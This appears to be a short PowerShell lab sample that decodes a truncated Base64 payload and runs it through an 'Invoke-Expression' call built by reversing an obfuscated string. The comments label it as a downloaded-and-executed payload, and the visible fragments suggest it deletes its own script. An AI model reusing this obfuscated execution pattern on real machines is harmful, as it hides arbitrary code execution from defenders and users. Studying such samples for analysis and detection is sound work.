# Gather host info
$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

# Base64 payload (PowerShell command, likely obfuscated)
$t1 = @"
JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEM...
...QAAgAHsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAFAAUwBDAG8AbQBtAGEAbgBkAFAA
YQB0AGgAIAB9AA==
"@

# Decode payload from Base64 (Unicode)
$t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))

# Obfuscated command to invoke: "Invoke-Expression"
$t3 = "noiSSerpxE-eKOvNI"
$t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

# Execute the decoded command
&($t4) $t2

# Confirmation (for lab context)
Write-Host "This has been downloaded off a remote server and executed."
